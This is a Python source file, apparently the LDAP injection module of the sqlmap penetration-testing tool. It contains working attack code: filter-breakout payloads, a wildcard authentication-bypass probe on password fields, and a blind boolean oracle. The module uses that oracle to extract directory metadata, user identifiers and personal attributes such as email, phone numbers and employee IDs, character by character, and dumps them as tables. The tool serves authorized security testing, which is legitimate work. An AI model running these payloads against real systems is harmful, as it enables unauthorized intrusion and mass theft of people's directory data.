#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re
import time

from collections import namedtuple

from lib.core.common import beep
from lib.core.common import randomStr
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import logger
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import PLACE
from lib.utils.nonsql import InconclusiveError
from lib.utils.nonsql import INCONCLUSIVE_MARK
from lib.utils.nonsql import userDecision
from lib.utils.nonsql import resolveBit
from lib.utils.nonsql import sqlErrorPresent
from lib.utils.nonsql import blockedStatus
from lib.utils.nonsql import ratio as _ratio
from lib.utils.nonsql import userOracleActive
from lib.core.settings import LDAP_CHAR_MAX
from lib.core.settings import LDAP_CHAR_MIN
from lib.core.settings import LDAP_ERROR_REGEX
from lib.core.settings import LDAP_ERROR_SIGNATURES
from lib.core.settings import LDAP_FINGERPRINT_ATTRIBUTES
from lib.core.settings import LDAP_MAX_LENGTH
from lib.core.settings import LDAP_MAX_RECORDS
from lib.core.settings import UPPER_RATIO_BOUND
from lib.request.connect import Connect as Request
from lib.utils.xrange import xrange


SENTINEL = randomStr(length=10, lowercase=True)


# _send() below currently knows how to rebuild GET and POST-style parameter
# strings. Cookie and URI delivery require separate per-place logic and should not
# be advertised until implemented.
LDAP_PLACES = (PLACE.GET, PLACE.POST, PLACE.CUSTOM_POST)

# Breakouts are tried against the original application filter template. The
# generated assertion fragments intentionally stay open-ended: the vulnerable
# application usually appends the closing ')' or trailing substring '*') itself.
LDAP_BREAKOUT_PREFIXES = (
    "*)",       # substring + one assertion:  (attr=*<input>*)
    ")",        # exact-match one assertion:   (attr=<input>)
    "|",        # injection at filter-list head
    "*))(",     # substring + two assertions deep
    "*)))",     # substring + three assertions deep
    ")))",      # exact-match three assertions deep
)

LDAP_TAUTOLOGY_ATTRIBUTES = (
    "objectClass",
    "uid",
    "cn",
)

ENTRY_KEY_ATTRIBUTES = (
    "uid",
    "sAMAccountName",
    "userPrincipalName",
    "mail",
    "cn",
)

DUMP_ATTRIBUTES = (
    "uid",
    "cn",
    "sn",
    "givenName",
    "displayName",
    "mail",
    "sAMAccountName",
    "userPrincipalName",
    "title",
    "department",
    "company",
    "o",
    "ou",
    "telephoneNumber",
    "mobile",
    "manager",
    "description",
    "l",
    "st",
    "street",
    "postalCode",
    "c",
    "co",
    "employeeID",
    "employeeNumber",
    "employeeType",
    "objectClass",
    "objectCategory",
)

MULTI_VALUE_ATTRIBUTES = (
    "member",
    "memberOf",
    "uniqueMember",
)

Slot = namedtuple("Slot", ("place", "parameter", "backend", "oracle", "template", "payload", "breakout", "bypass"))
Slot.__new__.__defaults__ = (None, None, None, None, None, None, None, None)




def _delim(place):
    return (conf.cookieDel or ';') if place == PLACE.COOKIE else '&'


def _confParameters(place):
    try:
        return conf.parameters.get(place, "")
    except AttributeError:
        return conf.parameters[place] if place in conf.parameters else ""


def _originalValue(place, parameter):
    for segment in _confParameters(place).split(_delim(place)):
        name, _, value = segment.partition('=')
        if name.strip() == parameter:
            return value
    return conf.paramDict.get(place, {}).get(parameter) or ""


def _replaceSegment(place, parameter, value):
    delimiter = _delim(place)
    raw = _confParameters(place)
    retVal, replaced = [], False

    for part in raw.split(delimiter):
        name, _, _ = part.partition('=')
        if not replaced and name.strip() == parameter:
            retVal.append("%s=%s" % (name, value))
            replaced = True
        else:
            retVal.append(part)

    if not replaced:
        retVal = []
        for name, oldValue in conf.paramDict.get(place, {}).items():
            retVal.append("%s=%s" % (name, value if name == parameter else oldValue))

    return delimiter.join(retVal)


def _send(place, parameter, value):
    skipUrlEncode = conf.skipUrlEncode
    conf.skipUrlEncode = True

    if conf.delay:
        time.sleep(conf.delay)

    try:
        kwargs = {"raise404": False, "silent": True}
        payload = _replaceSegment(place, parameter, value)
        kwargs["post" if place in (PLACE.POST, PLACE.CUSTOM_POST) else "get"] = payload

        if conf.verbose >= 3:
            logger.log(CUSTOM_LOGGING.PAYLOAD, payload)
        page, _, code = Request.getPage(**kwargs)
        # a transport failure or a BLOCKED/ERROR status (5xx, 403/429 WAF/rate-limit) is not a usable
        # oracle sample - signal None so `_boolean`/`extract` (which reject None) can't decide on it
        if blockedStatus(code):
            return None
        return page or ""
    except Exception as ex:
        logger.debug("LDAP probe request failed: %s" % getUnicode(ex))
        return None
    finally:
        conf.skipUrlEncode = skipUrlEncode


def _isError(page):
    # an LDAP error body OR a recognized SQL/DBMS error marks a response as NOT a valid boolean
    # template. The SQL/DBMS check (reusing sqlmap's errors.xml via htmlParser + the generic
    # `SQL (warning|error|syntax)` marker) is essential: an LDAP filter break-out like `1)(uid=*`
    # trips a DBMS SYNTAX ERROR on a SQL-injectable parameter, and that error page merely differs
    # from a normal page - which would otherwise fake a boolean oracle and misreport SQLi as LDAP.
    page = getUnicode(page or "")
    return bool(re.search(LDAP_ERROR_REGEX, page)) or sqlErrorPresent(page)


def _backendFromError(page):
    page = getUnicode(page or "")
    for backend, regex in LDAP_ERROR_SIGNATURES:
        if re.search(regex, page):
            return backend
    # ONLY a genuine LDAP error names a (generic) LDAP back-end - never a SQL/DBMS error (which
    # _isError() also flags, so it can reject a faked oracle, but which must NOT be attributed to LDAP)
    return "Generic LDAP" if re.search(LDAP_ERROR_REGEX, page) else None


def _probeBackendByParserError(place, parameter):
    """Probe for LDAP filter parser errors to obtain a backend hint.
    This is NOT authoritative vulnerability detection -- only a boolean
    oracle (from _detectBoolean) confirms exploitable injection."""

    original = _originalValue(place, parameter) or "x"
    normal = _send(place, parameter, original)

    # Use LDAP filter syntax breakers, not apostrophes. Apostrophes are not LDAP
    # filter metacharacters and only detect broken LDAP emulators backed by SQL.
    for suffix in (")", "*)"):
        payload = original + suffix
        broken = _send(place, parameter, payload)

        if not normal or _ratio(normal, broken) >= UPPER_RATIO_BOUND:
            continue

        backend = _backendFromError(broken)
        if backend and not _isError(normal):
            return backend, payload

    return None, None


def _boolean(truthy, falsy):
    """Return the reproducible true page when true/false probes diverge."""

    truePage = truthy()
    if not truePage or _isError(truePage):
        return None

    falsePage = falsy()
    if not falsePage or _isError(falsePage):
        return None

    truePage2 = truthy()
    if _ratio(truePage, truePage2) < UPPER_RATIO_BOUND:     # the TRUE side must independently reproduce
        return None
    if _ratio(falsePage, falsy()) < UPPER_RATIO_BOUND:      # the FALSE side must independently reproduce too
        return None

    # honor an explicit user oracle (--string/--not-string/--regexp) over raw similarity
    if userOracleActive():
        return truePage if (userDecision(truePage) is True and userDecision(falsePage) is False) else None

    if _ratio(truePage, falsePage) < UPPER_RATIO_BOUND:     # ... and true must differ from false
        return truePage

    return None


def _detectBoolean(place, parameter):
    """Return (template, payload, breakout) for boolean-blind LDAPi."""

    original = _originalValue(place, parameter) or ""

    for breakout in LDAP_BREAKOUT_PREFIXES:
        for attr in LDAP_TAUTOLOGY_ATTRIBUTES:
            # MATCHED controls: true and false share the SAME breakout, the SAME attribute and the
            # SAME open-fragment shape - only the assertion's truth changes. `(attr=*` matches every
            # directory entry; `(attr=<sentinel>` matches none. A diverging pair proves the value is
            # parsed as an LDAP FILTER (the `)(...` escaped the surrounding filter), which a plain
            # string search cannot reproduce. The old false control was a bare `original+SENTINEL`
            # (an UNMATCHED ordinary string), so a validation layer or wildcard search could diverge
            # for reasons unrelated to filter injection - a false positive.
            truePayload = "%s%s(%s=*" % (original, breakout, attr)
            falsePayload = "%s%s(%s=%s" % (original, breakout, attr, SENTINEL)
            template = _boolean(lambda p=truePayload: _send(place, parameter, p),
                                lambda p=falsePayload: _send(place, parameter, p))
            if template:
                return template, truePayload, breakout

    # NOTE: no bare `*`-vs-sentinel fallback. A wildcard returning more records is normal search
    # behavior, not proof of an LDAP filter-boundary escape, and carries no breakout for extraction.

    return None, None, None


def _isPasswordParam(parameter):
    parameter = getUnicode(parameter or "").lower()
    return any(_ in parameter for _ in ("pass", "pwd", "secret", "pin", "cred", "key", "token", "auth"))


def _detectAuthBypass(place, parameter):
    if not _isPasswordParam(parameter):
        return None

    starPage = _send(place, parameter, "*")
    sentinelPage = _send(place, parameter, SENTINEL)

    if starPage and sentinelPage and _ratio(starPage, sentinelPage) < UPPER_RATIO_BOUND:
        return "*"

    return None


def _fingerprintByError(backend):
    if not backend:
        return None
    if "Active Directory" in backend:
        return "Microsoft Active Directory"
    if "OpenLDAP" in backend:
        return "OpenLDAP"
    if "ApacheDS" in backend:
        return "ApacheDS"
    if "Oracle" in backend:
        return "Oracle Directory Server"
    if "389" in backend:
        return "389 Directory Server"
    if "python-ldap" in backend or "Java JNDI" in backend:
        return backend
    return backend


def _transportEncode(value):
    """
    Encode only transport-sensitive characters because _send() disables sqlmap's
    regular URL encoding. LDAP filter syntax should remain raw; assertion values
    should be passed through _ldapLiteral() first.
    """

    value = getUnicode(value)
    value = value.replace("%", "%25")
    value = value.replace("#", "%23")
    value = value.replace("&", "%26")
    value = value.replace("+", "%2B")
    value = value.replace("=", "%3D")
    value = value.replace(" ", "%20")
    return value


def _ldapLiteral(value):
    """Escape an LDAP assertion value, then protect URL transport bytes."""

    value = getUnicode(value)
    value = value.replace("\\", "\\5c")
    value = value.replace("*", "\\2a")
    value = value.replace("(", "\\28")
    value = value.replace(")", "\\29")
    value = value.replace("\x00", "\\00")
    return _transportEncode(value)


class _ProbeBuilder(object):
    """
    Build payloads that preserve the winning breakout shape.

    Simple probes are open fragments, e.g. SENTINEL*)(uid=adm*
    The target application's original filter template supplies the closing suffix.
    Compound probes close their own (&...) filter, then open a dummy assertion to
    consume that same application suffix.
    """

    def __init__(self, breakout):
        self.breakout = breakout or ")"

    def raw(self, fragment, lead=None):
        return "%s%s%s" % (lead if lead is not None else SENTINEL, self.breakout, fragment)

    def presence(self, attr, constraint=None, exclusions=None):
        assertion = "(%s=*)" % attr
        if constraint or exclusions:
            return self._compound(assertion, constraint=constraint, exclusions=exclusions)
        return self.raw("(%s=*" % attr)

    def prefix(self, attr, value, constraint=None, exclusions=None):
        assertion = "(%s=%s*)" % (attr, _ldapLiteral(value))
        if constraint or exclusions:
            return self._compound(assertion, constraint=constraint, exclusions=exclusions)
        return self.raw("(%s=%s*" % (attr, _ldapLiteral(value)))

    def contains(self, attr, value, constraint=None, exclusions=None):
        assertion = "(%s=*%s*)" % (attr, _ldapLiteral(value))
        if constraint or exclusions:
            return self._compound(assertion, constraint=constraint, exclusions=exclusions)
        return self.raw("(%s=*%s*" % (attr, _ldapLiteral(value)))

    def equals(self, attr, value, constraint=None, exclusions=None):
        assertion = "(%s=%s)" % (attr, _ldapLiteral(value))
        if constraint or exclusions:
            return self._compound(assertion, constraint=constraint, exclusions=exclusions)

        # Exact equality cannot be made reliable in an unknown trailing template,
        # so simple contexts fall back to prefix semantics.
        return self.prefix(attr, value)

    def _compound(self, assertion, constraint=None, exclusions=None):
        clauses = []

        if constraint:
            cAttr, cValue = constraint
            clauses.append("(%s=%s)" % (cAttr, _ldapLiteral(cValue)))

        for eAttr, eValue in exclusions or ():
            clauses.append("(!(%s=%s))" % (eAttr, _ldapLiteral(eValue)))

        # Raw '&' would split GET parameters because skipUrlEncode=True. Use %26
        # so the HTTP layer decodes it into LDAP '&' inside the parameter value.
        compound = "(%%26%s%s)" % ("".join(clauses), assertion)

        # Dummy suffix eater: the original app template can safely append its tail.
        return self.raw("%s(objectClass=%s*" % (compound, SENTINEL))


def _makeOracle(place, parameter, breakout):
    """Build the extraction oracle by RECALIBRATING its true/false models on the SAME base + winning
    breakout the extraction payloads use - the `_ProbeBuilder` leads every probe with SENTINEL, so
    the models must too. A matched always-true filter `SENTINEL<breakout>(objectClass=*` (objectClass
    is on every entry) and a matched always-FALSE `SENTINEL<breakout>(objectClass=<sentinel>` (no
    entry has it) - same shape, only the assertion's truth changed. The old oracle compared SENTINEL-
    based extraction payloads against an ORIGINAL-based detection template and a bare unreproduced
    SENTINEL false page - a base/shape mismatch. Reproduce both, require separable, else None."""

    cache = {}

    def request(payload):
        # cache ONLY usable responses - a cached transient failure would freeze a wrong bit forever
        if payload not in cache:
            page = _send(place, parameter, payload)
            if page and not _isError(page):
                cache[payload] = page
            return page
        return cache[payload]

    builder = _ProbeBuilder(breakout)
    truePayload = builder.raw("(objectClass=*")
    falsePayload = builder.raw("(objectClass=%s" % SENTINEL)
    trueModel = request(truePayload)
    falseModel = request(falsePayload)

    if trueModel is None or falseModel is None or _isError(trueModel) or _isError(falseModel):
        return None
    if _ratio(trueModel, _send(place, parameter, truePayload)) < UPPER_RATIO_BOUND:      # reproduce true
        return None
    if _ratio(falseModel, _send(place, parameter, falsePayload)) < UPPER_RATIO_BOUND:    # reproduce false
        return None
    if _ratio(trueModel, falseModel) >= UPPER_RATIO_BOUND:      # not separable -> can't extract reliably
        return None

    def extract(payload):
        # a positive bit (attribute-prefix match) must lean CLEARLY toward the recalibrated TRUE
        # model over the matched FALSE model (shared 3-way classifier) - NOT merely "different from
        # a bare sentinel page", which read a dynamic token / WAF body / transient exception as a
        # match and fabricated LDAP values one character at a time. A transport failure / error is
        # UNKNOWN (routed through resolveBit -> retry -> InconclusiveError), never a pre-decided False.
        page = request(payload)
        usable = page if (page and not _isError(page)) else None

        def fresh():
            p = _send(place, parameter, payload)
            return None if (not p or _isError(p)) else p
        return resolveBit(usable, trueModel, falseModel, fresh)

    def oracle(payload):
        return extract(payload)

    oracle.extract = extract
    oracle.template = trueModel
    oracle.falsePage = falseModel
    oracle.cache = cache
    return oracle


# Avoid LDAP metacharacters in blind character extraction. In real LDAP they can
# be escaped, but many simple test harnesses decode them before wildcard handling,
# The filter metacharacters *, (, ), \ are INCLUDED in the extraction charset: `_ldapLiteral()` escapes
# each one (*->\2a, (->\28, )->\29, \->\5c) in the prefix probe, so they are matched as LITERAL bytes
# (no wildcard / no false positive) and a value like `CN=Smith\, John (Admin)` or `abc*def` is recovered
# in full instead of being truncated at the first metacharacter. They sit at the FREQUENCY TAIL (rare in
# real data), so common characters are still tried first.
_META_ORDS = set()
_FREQ = (tuple(xrange(ord('a'), ord('z') + 1)) +
         tuple(xrange(ord('A'), ord('Z') + 1)) +
         tuple(xrange(ord('0'), ord('9') + 1)) +
         tuple(ord(_) for _ in "@._-+ ") +
         tuple(ord(_) for _ in "*()\\"))            # filter metacharacters (escaped by _ldapLiteral)
_CHARSET = []
for _ in _FREQ:
    if LDAP_CHAR_MIN <= _ <= LDAP_CHAR_MAX and _ not in _META_ORDS and _ not in _CHARSET:
        _CHARSET.append(_)
for _ in xrange(LDAP_CHAR_MIN, LDAP_CHAR_MAX + 1):
    if _ not in _META_ORDS and _ not in _CHARSET:
        _CHARSET.append(_)


def _exists(oracle, builder, attr, constraint=None, exclusions=None):
    return oracle.extract(builder.presence(attr, constraint=constraint, exclusions=exclusions))


def _inferAttribute(oracle, builder, attr, constraint=None, exclusions=None, maxLen=LDAP_MAX_LENGTH, strict=False):
    value = ""
    probes = 0

    try:
        for _ in xrange(maxLen):
            found = False

            for cp in _CHARSET:
                candidate = value + chr(cp)
                probes += 1

                if oracle.extract(builder.prefix(attr, candidate, constraint=constraint, exclusions=exclusions)):
                    value = candidate
                    found = True
                    break

            if not found:
                break

            # Three or more consecutive trailing spaces never occur in real
            # directory data.  When the server-side LDAP-to-SQL translation
            # (or equivalent) spuriously matches a trailing-space probe (e.g.
            # mail=user@dom * matching user@dom), the extraction would
            # otherwise chase an endless phantom suffix.  Terminate and strip.
            if value.endswith("   "):
                value = value.rstrip()
                break
    except InconclusiveError:
        # a structural caller (entry-key enumeration) must SEE the abort to mark the dump partial - it
        # is NOT end-of-data; a per-value caller instead gets None and renders an inconclusive marker
        if strict:
            raise
        logger.warning("LDAP extraction aborted for attribute '%s' (oracle inconclusive after retries)" % attr)
        return None

    logger.debug("LDAP blind inference: %d probes for attribute '%s' (length=%d)" % (probes, attr, len(value)))
    return value if value else None


def _fingerprintByAttribute(oracle, builder):
    for attr, expected, backend in LDAP_FINGERPRINT_ATTRIBUTES:
        if not _exists(oracle, builder, attr):
            continue

        if expected:
            if oracle.extract(builder.contains(attr, expected)):
                return backend
        else:
            return backend

    return None


def _dumpInband(oracle, slot):
    """If the always-true template page exposes directory entries directly
    (e.g. as JSON), extract them in one shot instead of blind brute-force."""
    import json

    page = oracle.template
    if not page or not page.strip().startswith('{'):
        return False

    try:
        data = json.loads(page)
        entries = data.get("entries") or data.get("results") or ()
    except (ValueError, TypeError):
        return False

    if not entries or not isinstance(entries, (list, tuple)):
        return False

    columns = []
    seen = set()
    for entry in entries:
        if not isinstance(entry, dict):
            continue
        for key in entry:
            if key not in seen:
                columns.append(getUnicode(key))
                seen.add(key)

    if not columns:
        return False

    rows = []
    for entry in entries:
        if not isinstance(entry, dict):
            continue
        rows.append(tuple(getUnicode(entry.get(c, "")) for c in columns))

    # Drop columns where every row is empty (common with wide schemas).
    populated = []
    for ci, col in enumerate(columns):
        if any(r[ci] for r in rows):
            populated.append(ci)
    if populated and len(populated) < len(columns):
        columns = [columns[i] for i in populated]
        rows = [tuple(r[i] for i in populated) for r in rows]

    logger.info("in-band data exposure: %d record(s)" % len(rows))
    _dumpTable("LDAP: %s parameter '%s' in-band entries" % (slot.place, slot.parameter),
               columns, rows)
    return True


def _probeRootDSE(oracle, builder):
    for attr in ("namingContexts", "subschemaSubentry", "vendorName", "vendorVersion"):
        if not _exists(oracle, builder, attr):
            continue

        value = _inferAttribute(oracle, builder, attr)
        if value:
            logger.info("directory %s: '%s'" % (attr, value))


def _enumerateEntryKeys(oracle, builder):
    for keyAttr in ENTRY_KEY_ATTRIBUTES:
        try:
            if not _exists(oracle, builder, keyAttr):
                continue
        except InconclusiveError:
            continue                                    # existence unknown for this key attr -> try next

        values, partial = [], False
        while len(values) < LDAP_MAX_RECORDS:
            exclusions = [(keyAttr, _) for _ in values]
            try:
                # strict: an inconclusive NEXT-entry key probe is UNKNOWN, not the end of the directory
                value = _inferAttribute(oracle, builder, keyAttr, exclusions=exclusions, strict=True)
            except InconclusiveError:
                partial = True
                logger.warning("directory entry enumeration became inconclusive after %d entr%s; the dump is PARTIAL" % (len(values), "y" if len(values) == 1 else "ies"))
                break

            if not value or value in values:            # "" / repeat -> genuine end
                break

            values.append(value)
            logger.info("identified directory entry: %s='%s'" % (keyAttr, value))

        if values:
            if len(values) >= LDAP_MAX_RECORDS:
                logger.warning("directory enumeration hit the LDAP_MAX_RECORDS (%d) cap; some entries may be omitted" % LDAP_MAX_RECORDS)
                partial = True                          # a truncated cap is NOT a complete dump
            return keyAttr, values, partial

    return None, [], False


def _dumpEntries(oracle, builder, place, parameter):
    keyAttr, keys, partial = _enumerateEntryKeys(oracle, builder)
    if not keys:
        logger.warning("could not identify a stable directory entry key")
        return False

    rows = []
    discovered = set()

    for key in keys:
        constraint = (keyAttr, key)
        row = {keyAttr: key}
        logger.info("extracting attributes for entry %s='%s'" % (keyAttr, key))

        for attr in DUMP_ATTRIBUTES:
            if attr == keyAttr:
                continue

            logger.info("probing attribute '%s'" % attr)
            try:
                if not _exists(oracle, builder, attr, constraint=constraint):
                    continue
            except InconclusiveError:
                continue                                # existence unknown -> skip this attribute
            # an attribute confirmed to exist but whose value is inconclusive must show the marker, NOT
            # be silently omitted (which would read as "attribute absent")
            value = _inferAttribute(oracle, builder, attr, constraint=constraint)
            row[attr] = INCONCLUSIVE_MARK if value is None else value
            discovered.add(attr)

        rows.append(row)

    columns = [keyAttr] + [_ for _ in DUMP_ATTRIBUTES if _ != keyAttr and _ in discovered]
    tableRows = [tuple(row.get(column, "") for column in columns) for row in rows]

    completeness = " (PARTIAL - entry enumeration aborted, oracle inconclusive)" if partial else ""
    logger.info("dumped %d entr%s%s" % (len(rows), "y" if len(rows) == 1 else "ies", completeness))
    _dumpTable("LDAP: %s parameter '%s' directory entries%s" % (place, parameter, completeness), columns, tableRows)
    return True


def _dumpMultiValues(oracle, builder, place, parameter):
    dumped = False

    for attr in MULTI_VALUE_ATTRIBUTES:
        if not _exists(oracle, builder, attr):
            continue

        # Multi-valued attributes (member, memberOf, uniqueMember) can hold several values in ONE entry.
        # LDAP filters are ENTRY-scoped, so the intuitive "exclude each recovered value to get the next"
        # walk is WRONG: (!(member=A)) excludes the whole ENTRY that holds member=A, so a second value of
        # the SAME entry can never surface, and the probe may instead match a DIFFERENT entry that also
        # carries the attribute - silently mixing entries while claiming a complete multi-value dump.
        # Recovering one value per attribute and labelling it honestly is correct; true per-value
        # enumeration needs a unique-entry binding or AD ranged retrieval (member;range=0-*), not
        # negation. Report the single recovered value as exactly that.
        value = _inferAttribute(oracle, builder, attr)
        if value:
            logger.info("recovered one matching value of multi-valued attribute '%s' "
                        "(full per-value enumeration is not proven over entry-scoped LDAP filters)" % attr)
            _dumpTable("LDAP: %s parameter '%s' '%s' (one matching value, NOT full multi-value enumeration)" % (place, parameter, attr),
                       [attr], [(value,)])
            dumped = True

    return dumped


def _grid(columns, rows):
    columns = [getUnicode(_) for _ in columns]
    rows = [[getUnicode(_) for _ in row] for row in rows]

    widths = []
    for index, column in enumerate(columns):
        width = len(column)
        for row in rows:
            if index < len(row):
                width = max(width, len(row[index]))
        widths.append(width)

    separator = "+-" + "-+-".join("-" * _ for _ in widths) + "-+"

    def line(cells):
        return "| " + " | ".join((cells[index] if index < len(cells) else "").ljust(widths[index]) for index in xrange(len(columns))) + " |"

    return "\n".join([separator, line(columns), separator] + [line(row) for row in rows] + [separator])


def _dumpTable(title, columns, rows):
    if rows:
        conf.dumper.singleString("%s:\n%s" % (title, _grid(columns, rows)))


def ldapScan():
    global SENTINEL
    SENTINEL = randomStr(length=10, lowercase=True)

    debugMsg = "'--ldap' is self-contained: it detects LDAP injection in HTTP "
    debugMsg += "parameters and dumps reachable directory entries. SQL enumeration "
    debugMsg += "switches (--banner, --dbs, --tables, --users, --sql-query) are ignored"
    logger.debug(debugMsg)

    if not conf.paramDict:
        logger.error("no request parameters to test (use --data, GET params, or similar)")
        return

    tested = found = 0
    slots = []

    for place in (_ for _ in LDAP_PLACES if _ in conf.paramDict):
        for parameter in list(conf.paramDict[place].keys()):
            if conf.testParameter and parameter not in conf.testParameter:
                continue

            tested += 1
            logger.info("testing LDAP injection on %s parameter '%s'" % (place, parameter))

            # Phase 1: probe the LDAP filter parser for a backend hint.
            # This is NOT authoritative -- only a boolean oracle confirms
            # exploitable injection.
            backendHint, _errorPayload = _probeBackendByParserError(place, parameter)
            if backendHint:
                backendHint = _fingerprintByError(backendHint)

            # Phase 2: establish a boolean oracle (authoritative).
            template, payload, breakout = _detectBoolean(place, parameter)
            if template and breakout:
                found += 1
                backend = backendHint or None
                if conf.beep:
                    beep()

                oracle = _makeOracle(place, parameter, breakout)
                if oracle is None:
                    # detection confirmed, but the extraction true/false models are not reliably
                    # separable -> report the finding WITHOUT dumping (never fabricate directory data)
                    logger.info("%s parameter '%s' is vulnerable to LDAP injection (back-end: '%s'); "
                                "extraction disabled (true/false models not reliably separable)" % (place, parameter, backend or "Generic"))
                    conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: LDAP injection\n    Title: LDAP boolean-based blind (extraction unavailable)\n    Payload: %s\n---" % (parameter, place, payload))
                    continue
                logger.info("%s parameter '%s' is vulnerable to LDAP injection (back-end: '%s')" % (place, parameter, backend or "Generic"))
                slots.append(Slot(place=place, parameter=parameter, backend=backend, oracle=oracle, template=oracle.template, payload=payload, breakout=breakout))
                continue

            # Phase 3: wildcard behavior on a credential field. A `*`-vs-random response difference is
            # NOT a confirmed authentication bypass: it proves neither a query-boundary escape nor an
            # authenticated-state transition (no redirect / session cookie / success-marker check here).
            # Report it as INFORMATIONAL only - a confirmed bypass needs a real authenticated-state proof.
            bypass = _detectAuthBypass(place, parameter)
            if bypass:
                logger.info("%s parameter '%s': wildcard '*' changes the response (possible LDAP filter influence / auth-bypass surface) - INFORMATIONAL, not a confirmed injection (no authenticated-state transition verified)" % (place, parameter))
                continue

            # Parser-error alone is not exploitable -- log it but do not
            # create a vulnerability report.
            if backendHint:
                logger.info("%s parameter '%s' reaches an LDAP filter parser (back-end: '%s'), but no exploitable boolean oracle was established" % (place, parameter, backendHint))

    if not slots:
        if tested:
            warnMsg = "no parameter appears to be injectable via LDAP injection (%d tested)" % tested
        else:
            warnMsg = "no parameters found to test for LDAP injection"
        logger.warning(warnMsg)
        return

    # Print auth-bypass reports.
    for slot in slots:
        if slot.bypass:
            conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: LDAP injection\n    Title: LDAP auth bypass (wildcard)\n    Payload: %s=%s\n---" % (slot.parameter, slot.place, slot.parameter, slot.bypass))

    # Select the first oracle-bearing slot for fingerprint + enumeration.
    slot = next((_ for _ in slots if _.oracle and _.breakout), None)
    if not slot:
        logger.info("LDAP scan complete")
        return

    # Refine backend fingerprint if we only have a generic hint.
    builder = _ProbeBuilder(slot.breakout)
    oracle = slot.oracle
    if not slot.backend or slot.backend == "Generic LDAP":
        backend = _fingerprintByAttribute(oracle, builder)
        if backend:
            logger.info("identified back-end: '%s'" % backend)
            slot = slot._replace(backend=backend)

    # Determine extraction method: in-band if the template page already
    # contains parseable JSON entries, otherwise blind.
    import json
    page = oracle.template
    inband = False
    if page and page.strip().startswith('{'):
        try:
            data = json.loads(page)
            entries = data.get("entries") or data.get("results") or ()
            inband = bool(entries and isinstance(entries, (list, tuple)))
        except (ValueError, TypeError):
            pass

    title = "LDAP in-band data exposure" if inband else "LDAP boolean-based blind"
    conf.dumper.singleString("---\nParameter: %s (%s)\n    Type: LDAP injection\n    Title: %s\n    Payload: %s=%s\n---" % (slot.parameter, slot.place, title, slot.parameter, slot.payload))

    logger.info("probing RootDSE-style directory metadata")
    _probeRootDSE(oracle, builder)

    if inband:
        dumped = _dumpInband(oracle, slot)
    else:
        dumped = _dumpEntries(oracle, builder, slot.place, slot.parameter)
        dumped = _dumpMultiValues(oracle, builder, slot.place, slot.parameter) or dumped

    if not dumped:
        warnMsg = "LDAP injection is confirmed but no directory data could be extracted. "
        warnMsg += "The injection point may expose only a limited boolean oracle or ACLs restrict reads"
        logger.warning(warnMsg)

    logger.info("LDAP scan complete")
